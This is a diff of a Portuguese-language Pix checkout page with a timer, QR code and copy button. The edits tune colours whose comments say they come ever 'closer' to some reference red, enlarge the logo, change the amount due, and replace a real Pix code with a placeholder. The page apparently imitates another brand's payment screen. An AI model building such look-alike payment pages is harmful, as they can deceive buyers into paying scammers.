@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
@@ -6,10 +5,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
-/* ===== CORES (AJUSTÁVEIS) ===== */
+/* ===== CORES (AJUSTADAS) ===== */
 :root{
-    --vermelho:#ee4d2d;        /* vermelho bem próximo */
-    --vermelho-escuro:#d63f25;
+    --vermelho:#fb5533;        /* vermelho ainda mais próximo */
+    --vermelho-escuro:#d73211; /* hover */
     --cinza:#777;
     --borda:#e5e5e5;
 }
@@ -34,8 +33,9 @@ body{
     align-items:center;
 }
 
+/* LOGO UM POUCO MAIOR */
 .header img{
-    height:28px;
+    height:34px; /* antes 28px */
 }
 
 /* ===== CONTAINER ===== */
@@ -149,7 +149,6 @@ button:disabled{
 
 <!-- TOPO / LOGO -->
 <div class="header">
-    <!-- TROQUE A LOGO -->
     <img src="logo.png" alt="Logo">
 </div>
 
@@ -159,7 +158,7 @@ button:disabled{
 
     <div class="row">
         <span>Pagamento Total</span>
-        <strong>R$ 500,00</strong>
+        <strong>R$ 50,00</strong>
     </div>
 
     <div class="timer">
@@ -169,11 +168,9 @@ button:disabled{
     <div class="pix-box">
         <div><strong>Pix</strong></div>
 
-        <!-- QR CODE -->
         <img src="qrcode.png" alt="QR Code Pix">
 
-        <!-- CÓDIGO PIX -->
-        <pre id="codigo" style="display:none;">00020101021226790014br.gov.bcb.pix2557qrcode.mwbank.com.br/cob/699e2f24791f4a7c8010892526e843035204000053039865802BR5916IVI GATEWAY LTDA6009JOINVILLE62070503***63047A09</pre>
+        <pre id="codigo" style="display:none;">SEU_CODIGO_PIX_AQUI</pre>
 
         <button id="copiar">Copiar código Pix</button>
     </div>
